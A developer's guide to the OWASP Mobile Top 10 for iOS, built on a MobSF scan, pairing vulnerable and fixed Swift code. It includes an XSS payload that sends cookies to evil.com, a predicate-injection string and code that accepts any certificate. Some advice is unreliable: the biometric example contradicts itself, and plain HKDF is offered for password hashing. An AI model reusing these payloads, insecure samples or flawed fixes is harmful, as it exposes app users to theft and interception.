# OWASP Mobile Top 10 — iOS Developer's Practical Guide

> Written by a developer who built iOS apps for 10 years before studying security.
> Every risk below includes a **real Swift code example** of the vulnerability and the fix.

---

## 🔍 Real-World Scan Results (MobSF v4.5.0)

This guide is grounded in a real static analysis scan performed using [MobSF (Mobile Security Framework)](https://github.com/MobSF/Mobile-Security-Framework-MobSF) on an iOS application.

### MobSF scorecard
![image alt](https://github.com/gurjitsi/cyber-security-portfolio/blob/14c231adee3b495d5cc96f28bb9b07e70611e8c4/mobsf-audit/imagegalleryapp.png)

| Finding | Severity | OWASP Mobile Risk |
|---|---|---|
| ATS `AllowsArbitraryLoads` enabled | 🔴 High | M8 – Security Misconfiguration |
| Files may contain hardcoded sensitive information | 🔴 High | M1 – Improper Credential Usage |
| App logs information (sensitive data risk) | 🔵 Info | M8 – Security Misconfiguration |
| No privacy trackers detected | ✅ Secure | M6 – Inadequate Privacy Controls |

**Baseline Score: 40/100 (Grade B) → Target: 85+/100 after remediations**

> The goal of this project is to document every finding, map it to the OWASP Mobile Top 10, and show the concrete fix in Swift.

---

## The 10 Risks at a Glance

| # | Risk | iOS Relevance | Severity |
|---|---|---|---|
| M1 | Improper Credential Usage | Hardcoded API keys in Swift source | 🔴 Critical |
| M2 | Inadequate Supply Chain Security | Unvetted CocoaPods / SPM packages | 🔴 Critical |
| M3 | Insecure Authentication | Missing biometric fallback protection | 🔴 Critical |
| M4 | Insufficient Input/Output Validation | SQL injection via CoreData predicates | 🟠 High |
| M5 | Insecure Communication | Missing certificate pinning | 🔴 Critical |
| M6 | Inadequate Privacy Controls | Excessive permissions, tracking without consent | 🟠 High |
| M7 | Insufficient Binary Protections | No jailbreak detection, debug symbols left in | 🟡 Medium |
| M8 | Security Misconfiguration | ATS exceptions, debug logging in production | 🟠 High |
| M9 | Insecure Data Storage | Sensitive data in NSUserDefaults / plaintext files | 🔴 Critical |
| M10 | Insufficient Cryptography | Using MD5/SHA1, hardcoded IV, ECB mode | 🔴 Critical |

---

## M1 — Improper Credential Usage

**What it is:** API keys, tokens, or passwords hardcoded directly in source code or stored insecurely.

> 🔴 **MobSF flagged this:** "Files may contain hardcoded sensitive information like usernames, passwords, keys etc."

**Why it matters:** Hardcoded keys in iOS binaries can be extracted with tools like `strings` or `otool` in under 60 seconds. Even if you never share your source code, the compiled `.ipa` file is enough.

**❌ Vulnerable Swift code:**

```swift
// Never do this — visible in binary and source control
let apiKey = "sk-prod-abc123xyz789secretkey"
let baseURL = "https://api.example.com?key=\(apiKey)"
```

**✅ Secure fix — use Keychain:**

```swift
// Store in Keychain at setup, retrieve at runtime — never hardcode
func getAPIKey() -> String? {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "api_key",
        kSecReturnData as String: true
    ]
    var result: AnyObject?
    SecItemCopyMatching(query as CFDictionary, &result)
    guard let data = result as? Data else { return nil }
    return String(data: data, encoding: .utf8)
}

func storeAPIKey(_ key: String) -> Bool {
    guard let data = key.data(using: .utf8) else { return false }
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "api_key",
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    SecItemDelete(query as CFDictionary)
    return SecItemAdd(query as CFDictionary, nil) == errSecSuccess
}
```

**Remediation checklist:**
- [ ] Run `git grep -r "password\|apiKey\|secret\|token"` to find any hardcoded values
- [ ] Rotate any keys that were previously hardcoded
- [ ] Use `.xcconfig` files with `.gitignore` for build-time injection
- [ ] Consider a secrets scanner (e.g. `truffleHog`, `gitleaks`) in your CI pipeline

---

## M2 — Inadequate Supply Chain Security

**What it is:** Unvetted third-party libraries (CocoaPods, Swift Package Manager) can introduce malicious or vulnerable code into your app.

**Why it matters:** In 2021, the `node-ipc` package deliberately corrupted files on Russian/Belarusian machines — the same class of attack is possible in iOS dependencies. You inherit every vulnerability in every package you import.

**❌ Vulnerable approach — blindly trusting packages:**

```swift
// Package.swift — no version pinning, using a package with known CVEs
dependencies: [
    .package(url: "https://github.com/SomeUser/SomeLib", branch: "main"), // ❌ No version lock
    .package(url: "https://github.com/AnotherLib/NetworkKit", from: "1.0.0") // ❌ Too broad
]
```

**✅ Secure fix — pin exact versions and audit:**

```swift
// Package.swift — pin to exact versions you have reviewed
dependencies: [
    .package(url: "https://github.com/Alamofire/Alamofire", exact: "5.9.1"),
    .package(url: "https://github.com/kishikawakatsumi/KeychainAccess", exact: "4.2.2")
]
```

**Audit commands:**

```bash
# Check for known vulnerabilities in your Swift packages
# Using the OSS Index / Sonatype scanner
brew install sonatype-oss-index-auditor

# Review all resolved package versions
cat Package.resolved | python3 -m json.tool

# Check a CocoaPod for known CVEs
pod outdated
```

**Remediation checklist:**
- [ ] Pin all dependencies to exact versions in `Package.resolved`
- [ ] Review the source code of any package before adding it
- [ ] Check packages against [OSS Index](https://ossindex.sonatype.org/) or [Snyk](https://snyk.io/)
- [ ] Set up Dependabot alerts on your GitHub repository
- [ ] Minimise dependencies — if you can write 20 lines of Swift instead of importing a library, do it

---

## M3 — Insecure Authentication

**What it is:** Authentication mechanisms that can be bypassed — missing biometric fallback protection, no session expiry, or weak PIN implementations.

**Why it matters:** If an attacker has physical access to a device (stolen phone), a weak authentication flow is the only thing between them and your user's data.

**❌ Vulnerable — no biometric fallback protection:**

```swift
// This allows bypassing Face ID with device passcode — no context check
let context = LAContext()
context.evaluatePolicy(
    .deviceOwnerAuthenticationWithBiometrics, // ❌ Falls back to passcode silently
    localizedReason: "Authenticate to continue"
) { success, error in
    if success { unlockApp() }
}
```

**❌ Vulnerable — storing session token without expiry:**

```swift
// Token stored forever with no expiry — valid indefinitely after theft
UserDefaults.standard.set(sessionToken, forKey: "session_token")
```

**✅ Secure fix — biometrics with policy check and expiry:**

```swift
import LocalAuthentication

func authenticateUser(completion: @escaping (Bool, Error?) -> Void) {
    let context = LAContext()
    var error: NSError?

    // Check if biometrics are available and not invalidated
    guard context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) else {
        completion(false, error)
        return
    }

    // Set a reuse duration — don't re-prompt within 5 seconds
    context.touchIDAuthenticationAllowableReuseDuration = 5

    context.evaluatePolicy(
        .deviceOwnerAuthenticationWithBiometrics,
        localizedReason: "Verify your identity to access your account"
    ) { success, evaluationError in
        DispatchQueue.main.async {
            completion(success, evaluationError)
        }
    }
}

// Store token with expiry timestamp in Keychain
func storeSessionToken(_ token: String, expiresIn seconds: TimeInterval) {
    let expiry = Date().addingTimeInterval(seconds)
    let payload: [String: Any] = ["token": token, "expiry": expiry.timeIntervalSince1970]
    guard let data = try? JSONSerialization.data(withJSONObject: payload) else { return }

    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "session_token",
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    SecItemDelete(query as CFDictionary)
    SecItemAdd(query as CFDictionary, nil)
}

func getValidSessionToken() -> String? {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "session_token",
        kSecReturnData as String: true
    ]
    var result: AnyObject?
    guard SecItemCopyMatching(query as CFDictionary, &result) == errSecSuccess,
          let data = result as? Data,
          let payload = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
          let token = payload["token"] as? String,
          let expiryTimestamp = payload["expiry"] as? TimeInterval,
          Date().timeIntervalSince1970 < expiryTimestamp else { // ✅ Check expiry
        return nil
    }
    return token
}
```

**Remediation checklist:**
- [ ] Use `deviceOwnerAuthenticationWithBiometrics` — not `deviceOwnerAuthentication` (which silently allows passcode bypass)
- [ ] Implement session token expiry (typically 15 min–24 hr depending on sensitivity)
- [ ] Invalidate tokens on app background if handling financial/health data
- [ ] Use `LAContext.invalidate()` after use to clear biometric session

---

## M4 — Insufficient Input/Output Validation

**What it is:** Failing to sanitise user input before it reaches databases, parsers, or UI — enabling injection attacks.

**Why it matters:** iOS apps frequently interact with CoreData, SQLite, and web views. Unsanitised input into any of these can lead to data exfiltration or script injection.

**❌ Vulnerable — CoreData predicate injection:**

```swift
// User controls the format string — classic injection
let userInput = "' OR 1=1 OR name LIKE '"
let predicate = NSPredicate(format: "name = '\(userInput)'") // ❌ String interpolation in predicate
let results = try context.fetch(fetchRequest)
// Returns ALL records — attacker bypasses the filter
```

**❌ Vulnerable — WKWebView XSS:**

```swift
// Rendering unsanitised user content in a WebView
let userComment = "<script>document.location='https://evil.com?c='+document.cookie</script>"
webView.loadHTMLString("<html><body>\(userComment)</body></html>", baseURL: nil) // ❌
```

**✅ Secure fix — parameterised predicates:**

```swift
// Always use %@ substitution — CoreData handles escaping
let userInput = request.parameters["name"] ?? ""
let predicate = NSPredicate(format: "name = %@", userInput) // ✅ Safe parameterisation
fetchRequest.predicate = predicate
let results = try context.fetch(fetchRequest)
```

**✅ Secure fix — sanitise before rendering in WebView:**

```swift
import WebKit

func sanitiseForHTML(_ input: String) -> String {
    return input
        .replacingOccurrences(of: "&", with: "&amp;")
        .replacingOccurrences(of: "<", with: "&lt;")
        .replacingOccurrences(of: ">", with: "&gt;")
        .replacingOccurrences(of: "\"", with: "&quot;")
        .replacingOccurrences(of: "'", with: "&#x27;")
}

// Disable JavaScript entirely if not needed
let config = WKWebViewConfiguration()
let preferences = WKWebpagePreferences()
preferences.allowsContentJavaScript = false // ✅
config.defaultWebpagePreferences = preferences
let webView = WKWebView(frame: .zero, configuration: config)
```

**Remediation checklist:**
- [ ] Never use string interpolation in `NSPredicate` — always use `%@`
- [ ] Validate all user input against an allowlist (not blocklist) of permitted characters
- [ ] Disable JavaScript in `WKWebView` unless explicitly required
- [ ] Use `WKContentRuleList` to block unwanted resource loads in web views

---

## M5 — Insecure Communication

**What it is:** Transmitting sensitive data without proper TLS validation, allowing man-in-the-middle attacks.

**Why it matters:** On public Wi-Fi, an attacker with tools like `mitmproxy` or `Charles Proxy` can intercept all traffic if your app doesn't enforce certificate pinning.

**❌ Vulnerable — disabling SSL validation:**

```swift
// Dangerous — accepts any certificate including an attacker's self-signed cert
class InsecureDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession,
                    didReceive challenge: URLAuthenticationChallenge,
                    completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!)) // ❌
    }
}
```

**✅ Secure fix — certificate pinning:**

```swift
func urlSession(_ session: URLSession,
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {

    guard challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
          let serverTrust = challenge.protectionSpace.serverTrust,
          let pinnedCert = loadPinnedCertificate() else {
        completionHandler(.cancelAuthenticationChallenge, nil)
        return
    }

    let serverCerts = (0..<SecTrustGetCertificateCount(serverTrust))
        .compactMap { SecTrustGetCertificateAtIndex(serverTrust, $0) }

    let match = serverCerts.contains {
        SecCertificateGetData($0) == SecCertificateGetData(pinnedCert)
    }

    completionHandler(
        match ? .useCredential : .cancelAuthenticationChallenge,
        match ? URLCredential(trust: serverTrust) : nil
    )
}

func loadPinnedCertificate() -> SecCertificate? {
    guard let certURL = Bundle.main.url(forResource: "api_cert", withExtension: "der"),
          let certData = try? Data(contentsOf: certURL) else { return nil }
    return SecCertificateCreateWithData(nil, certData as CFData)
}
```

**Remediation checklist:**
- [ ] Never override `URLSessionDelegate` to accept all certificates
- [ ] Implement certificate or public key pinning for all API endpoints
- [ ] Ensure `Info.plist` has no `NSAllowsArbitraryLoads = true` (see M8)
- [ ] Test with `mitmproxy` to verify pinning is enforced

---

## M6 — Inadequate Privacy Controls

**What it is:** Apps requesting more permissions than needed, tracking users without consent, or sharing data with third-party SDKs without disclosure.

> ✅ **MobSF confirmed:** "This application has no privacy trackers" — this is a Secure finding in your scan.

**Why it matters:** Apple's App Privacy Report (iOS 15+) shows users exactly which domains your app contacts and which sensors it uses. Over-permissioning triggers distrust and App Store rejection.

**❌ Vulnerable — requesting unnecessary permissions:**

```swift
// Requesting camera permission in a notes app — not justified
AVCaptureDevice.requestAccess(for: .video) { granted in
    // Used only for a minor feature — should be optional, not on launch
}

// Accessing location continuously when only needed once
locationManager.startUpdatingLocation() // ❌ Continuous drain
locationManager.allowsBackgroundLocationUpdates = true // ❌ Unnecessary background access
```

**✅ Secure fix — minimal permissions, just-in-time requests:**

```swift
import CoreLocation
import AVFoundation

// Request location only when needed, only the precision required
func requestLocationWhenNeeded() {
    let manager = CLLocationManager()
    // ✅ Use WhenInUse instead of Always unless background is truly required
    manager.requestWhenInUseAuthorization()
    // ✅ Use reduced accuracy for features that don't need exact location
    manager.desiredAccuracy = kCLLocationAccuracyReduced
    manager.requestLocation() // One-shot, not continuous
}

// Add clear purpose strings to Info.plist — be specific, not generic
// NSLocationWhenInUseUsageDescription:
//   "We use your location to show nearby results. We never store or share it."
// NSCameraUsageDescription:
//   "Camera is used only to scan QR codes. Photos are not saved or uploaded."
```

**App Privacy manifest (`PrivacyInfo.xcprivacy`) — required from iOS 17:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>NSPrivacyTracking</key>
    <false/> <!-- ✅ Matches your MobSF scan — no trackers -->
    <key>NSPrivacyCollectedDataTypes</key>
    <array>
        <!-- Declare every data type you collect -->
        <dict>
            <key>NSPrivacyCollectedDataType</key>
            <string>NSPrivacyCollectedDataTypeEmailAddress</string>
            <key>NSPrivacyCollectedDataTypeLinked</key>
            <true/>
            <key>NSPrivacyCollectedDataTypeTracking</key>
            <false/>
            <key>NSPrivacyCollectedDataTypePurposes</key>
            <array>
                <string>NSPrivacyCollectedDataTypePurposeAppFunctionality</string>
            </array>
        </dict>
    </array>
</dict>
</plist>
```

**Remediation checklist:**
- [ ] Audit every `Info.plist` permission — remove any not actively used
- [ ] Replace vague purpose strings ("We need your location") with specific ones
- [ ] Add `PrivacyInfo.xcprivacy` manifest (required for App Store from May 2024)
- [ ] Audit any third-party SDKs — each one may add its own trackers

---

## M7 — Insufficient Binary Protections

**What it is:** Compiled app binaries that are easy to reverse-engineer, tamper with, or run on jailbroken devices.

**Why it matters:** A motivated attacker can patch your `.ipa` to bypass in-app purchases, extract business logic, or inject malicious code — all without your source.

**❌ Vulnerable — no jailbreak detection, debug symbols in binary:**

```swift
// Scheme: Debug — build settings leave dSYM and symbols in the binary
// ENABLE_TESTABILITY = YES in Release ❌
// STRIP_INSTALLED_PRODUCT = NO ❌

// No check for jailbroken environment
func loadPremiumContent() {
    // Directly accessible — no integrity check
    showPremiumUI()
}
```

**✅ Secure fix — basic jailbreak detection:**

```swift
import UIKit

struct SecurityChecks {

    /// Heuristic jailbreak detection — not foolproof, but raises the bar
    static var isDeviceCompromised: Bool {
        #if targetEnvironment(simulator)
        return false // Skip checks in simulator
        #else
        return hasJailbreakFiles || canWriteOutsideSandbox || hasSuspiciousSchemes
        #endif
    }

    private static var hasJailbreakFiles: Bool {
        let paths = [
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",
            "/usr/sbin/sshd",
            "/etc/apt",
            "/private/var/lib/apt/"
        ]
        return paths.contains { FileManager.default.fileExists(atPath: $0) }
    }

    private static var canWriteOutsideSandbox: Bool {
        let testPath = "/private/jailbreak_test_\(UUID().uuidString)"
        do {
            try "test".write(toFile: testPath, atomically: true, encoding: .utf8)
            try FileManager.default.removeItem(atPath: testPath)
            return true // ❌ Should not be able to write here
        } catch {
            return false // ✅ Expected on non-jailbroken device
        }
    }

    private static var hasSuspiciousSchemes: Bool {
        guard let cydiaURL = URL(string: "cydia://package/com.example.package") else { return false }
        return UIApplication.shared.canOpenURL(cydiaURL)
    }
}

// Use at app launch
if SecurityChecks.isDeviceCompromised {
    // Log the event, alert the user, optionally restrict functionality
    showTamperingAlert()
}
```

**Build settings for Release (Xcode):**

```
// Release scheme build settings:
ENABLE_TESTABILITY = NO           ✅
STRIP_INSTALLED_PRODUCT = YES     ✅
STRIP_STYLE = all-symbols         ✅
GCC_OPTIMIZATION_LEVEL = s        ✅
VALIDATE_PRODUCT = YES            ✅
```

**Remediation checklist:**
- [ ] Enable all strip settings in the Release build scheme
- [ ] Add heuristic jailbreak detection at launch
- [ ] Consider using `DeveloperModeIndicator` (iOS 16+) to detect developer mode
- [ ] For high-value apps, consider commercial RASP solutions (e.g. Guardsquare iXGuard)

---

## M8 — Security Misconfiguration

**What it is:** Insecure defaults left in place — ATS disabled, debug logging in production builds, verbose error messages.

> 🔴 **MobSF flagged this (High):** "App Transport Security AllowsArbitraryLoads is allowed"
> 🔵 **MobSF flagged this (Info):** "The App logs information. Sensitive information should never be logged."

This is the single biggest contributor to your 40/100 score. Fixing these two issues alone will significantly improve it.

**❌ Vulnerable `Info.plist` — ATS disabled:**

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/> <!-- ❌ HIGH severity — disables ATS for all connections -->
</dict>
```

**✅ Secure fix — remove the exception entirely or whitelist specific domains:**

```xml
<!-- Option 1: Remove NSAppTransportSecurity entirely — ATS is on by default ✅ -->

<!-- Option 2: If you need an exception for a specific domain only -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSExceptionDomains</key>
    <dict>
        <key>legacy-api.example.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <false/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.3</string>
            <key>NSIncludesSubdomains</key>
            <false/>
        </dict>
    </dict>
</dict>
```

**❌ Vulnerable — logging sensitive data in production:**

```swift
// Visible in Console.app and device logs — accessible to any app in debug
print("User logged in: \(user.email)")       // ❌
print("Auth token: \(authToken)")            // ❌ MobSF info finding
NSLog("Payment response: \(paymentData)")    // ❌
```

**✅ Secure fix — gate all logging behind debug flag:**

```swift
// Create a logging utility that compiles away in Release
struct AppLogger {
    static func debug(_ message: String,
                      file: String = #file,
                      line: Int = #line) {
        #if DEBUG
        let filename = URL(fileURLWithPath: file).lastPathComponent
        print("[\(filename):\(line)] \(message)")
        #endif
        // In Release: this entire block is removed by the compiler ✅
    }

    static func error(_ message: String) {
        // Errors can be logged to a crash reporter (e.g. Sentry, Crashlytics)
        // but never include PII or sensitive values
        #if DEBUG
        print("[ERROR] \(message)")
        #endif
    }
}

// Usage
AppLogger.debug("View loaded") // ✅ Safe — stripped in Release
// Never: AppLogger.debug("Token: \(authToken)") — never log sensitive values even in DEBUG
```

**Remediation checklist:**
- [ ] Search `Info.plist` for `NSAllowsArbitraryLoads` — delete it
- [ ] Replace all `print()` and `NSLog()` calls with a `#if DEBUG` gated logger
- [ ] Audit every log statement — ensure no tokens, passwords, emails, or PII appear
- [ ] In Xcode: set `OTHER_SWIFT_FLAGS = -DDEBUG` for Debug scheme only
- [ ] Run MobSF again after fixes to verify score improves

---

## M9 — Insecure Data Storage

**What it is:** Storing sensitive data in insecure locations — NSUserDefaults, plaintext files, or unencrypted databases.

**Why it matters:** NSUserDefaults is stored as a plaintext `.plist` file. On a jailbroken device or via a device backup, anyone can read it.

**❌ Vulnerable:**

```swift
// NSUserDefaults is NOT encrypted — readable by anyone with device access
UserDefaults.standard.set(authToken, forKey: "user_auth_token")  // ❌
UserDefaults.standard.set(userPassword, forKey: "user_password") // ❌

// Storing sensitive data in Documents directory (included in unencrypted backups)
let path = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    .appendingPathComponent("user_data.json")
try data.write(to: path) // ❌ No encryption, backed up to iCloud/iTunes
```

**✅ Secure fix — use Keychain for secrets:**

```swift
func saveToKeychain(key: String, value: String) -> Bool {
    guard let data = value.data(using: .utf8) else { return false }
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly // ✅ Not synced to iCloud
    ]
    SecItemDelete(query as CFDictionary) // Remove existing before adding
    return SecItemAdd(query as CFDictionary, nil) == errSecSuccess
}

// For files that must be stored — use Data Protection
let sensitiveURL = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask)[0]
    .appendingPathComponent("sensitive.dat")

try sensitiveData.write(
    to: sensitiveURL,
    options: [.completeFileProtection] // ✅ Encrypted at rest, unlocked only when device is unlocked
)

// Exclude from backups if truly sensitive
var resourceValues = URLResourceValues()
resourceValues.isExcludedFromBackup = true
try sensitiveURL.setResourceValues(resourceValues) // ✅ Not in iCloud or iTunes backup
```

**Key rule:** Anything sensitive (tokens, passwords, PII) → Keychain. Everything else → encrypted CoreData or UserDefaults for non-sensitive preferences only.

**Remediation checklist:**
- [ ] `grep -r "UserDefaults" --include="*.swift"` — audit every key stored
- [ ] Move any secret/token/credential to Keychain
- [ ] Use `.completeFileProtection` for sensitive files
- [ ] Set `isExcludedFromBackup = true` on sensitive files
- [ ] Enable encrypted CoreData persistent store for sensitive user data

---

## M10 — Insufficient Cryptography

**What it is:** Using weak/broken algorithms (MD5, SHA1, DES), hardcoded encryption keys, or insecure modes (ECB).

**Why it matters:** MD5 and SHA1 are collision-broken and are trivially reversed for common inputs via rainbow tables. ECB mode encrypts identical blocks identically — patterns in plaintext are visible in ciphertext.

**❌ Vulnerable:**

```swift
import CryptoKit

// MD5 is broken — do not use for security purposes
let data = Data(password.utf8)
let hash = Insecure.MD5.hash(data: data) // ❌ Broken

// Hardcoded key — same key for every user, every install
let key = SymmetricKey(data: Data("hardcoded-key-1234".utf8)) // ❌

// SHA1 — also broken for collision resistance
let sha1 = Insecure.SHA1.hash(data: data) // ❌
```

**✅ Secure fix — use modern algorithms:**

```swift
import CryptoKit

// ✅ SHA-256 for data integrity / non-password hashing
let hash = SHA256.hash(data: data)
let hashString = hash.compactMap { String(format: "%02x", $0) }.joined()

// ✅ AES-GCM for encryption (authenticated encryption — detects tampering)
func encrypt(data: Data, key: SymmetricKey) throws -> (ciphertext: Data, nonce: Data, tag: Data) {
    let sealedBox = try AES.GCM.seal(data, using: key)
    return (
        ciphertext: sealedBox.ciphertext,
        nonce: Data(sealedBox.nonce),
        tag: sealedBox.tag
    )
}

// ✅ Generate a unique key per user, stored in Keychain — never hardcoded
func generateAndStoreKey() -> SymmetricKey {
    let key = SymmetricKey(size: .bits256) // 256-bit AES key
    let keyData = key.withUnsafeBytes { Data($0) }
    // Store keyData in Keychain (see M9 / M1 examples above)
    return key
}

// ✅ For password hashing — use HKDF (or a bcrypt/Argon2 library)
func deriveKey(from password: String, salt: Data) -> SymmetricKey {
    let passwordKey = SymmetricKey(data: Data(password.utf8))
    return HKDF<SHA256>.deriveKey(
        inputKeyMaterial: passwordKey,
        salt: salt,
        info: Data("app-encryption-context".utf8),
        outputByteCount: 32
    )
}
```

**Remediation checklist:**
- [ ] Search for `Insecure.MD5`, `Insecure.SHA1`, `kCCAlgorithmDES` — replace all usages
- [ ] Never hardcode a `SymmetricKey` — generate per-user, store in Keychain
- [ ] Use `AES.GCM` (authenticated) over raw `AES.CBC`
- [ ] For password storage server-side, use Argon2id or bcrypt (not SHA256 alone)
- [ ] Check `CommonCrypto` usage — `kCCAlgorithmDES` and `kCCModeECB` are red flags

---

## Remediation Summary

| Risk | Status | Fix Required |
|---|---|---|
| M1 – Improper Credential Usage | 🔴 Flagged by MobSF | Move hardcoded values to Keychain |
| M2 – Supply Chain Security | ⚪ Review needed | Pin SPM/CocoaPod versions, audit deps |
| M3 – Insecure Authentication | ⚪ Review needed | Add session expiry, biometric protection |
| M4 – Input Validation | ⚪ Review needed | Use parameterised predicates, sanitise WebView |
| M5 – Insecure Communication | ⚪ Review needed | Remove ATS exception, add cert pinning |
| M6 – Privacy Controls | ✅ Secure (MobSF) | Maintain — add PrivacyInfo.xcprivacy |
| M7 – Binary Protections | ⚪ Review needed | Strip symbols, add jailbreak detection |
| M8 – Security Misconfiguration | 🔴 Flagged by MobSF | Remove AllowsArbitraryLoads, gate logging |
| M9 – Insecure Data Storage | ⚪ Review needed | Audit UserDefaults, use Keychain + file protection |
| M10 – Insufficient Cryptography | ⚪ Review needed | Replace MD5/SHA1, use AES-GCM |

**Score target after M1 + M8 remediations: ~70–75/100**
**Score target after full remediation: 85+/100**

---

## Tools Used

| Tool | Purpose |
|---|---|
| [MobSF v4.5.0](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Static analysis, scorecard generation |
| [OWASP Mobile Top 10 (2024)](https://owasp.org/www-project-mobile-top-10/) | Risk reference framework |
| Xcode Instruments | Memory and file system analysis |
| `strings` / `otool` | Binary inspection for hardcoded values |
| `mitmproxy` | Network traffic interception testing |

---

## References

- [OWASP Mobile Top 10 — 2024](https://owasp.org/www-project-mobile-top-10/)
- [Apple — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [Apple — App Transport Security](https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity)
- [Apple — Protecting user privacy](https://developer.apple.com/documentation/uikit/protecting_the_user_s_privacy)
- [Apple — CryptoKit](https://developer.apple.com/documentation/cryptokit)
- [MobSF Documentation](https://mobsf.github.io/docs/)

---

*Last updated: May 2026*
*Scan performed with MobSF v4.5.0 | Score: 40/100 → Target: 85+/100*
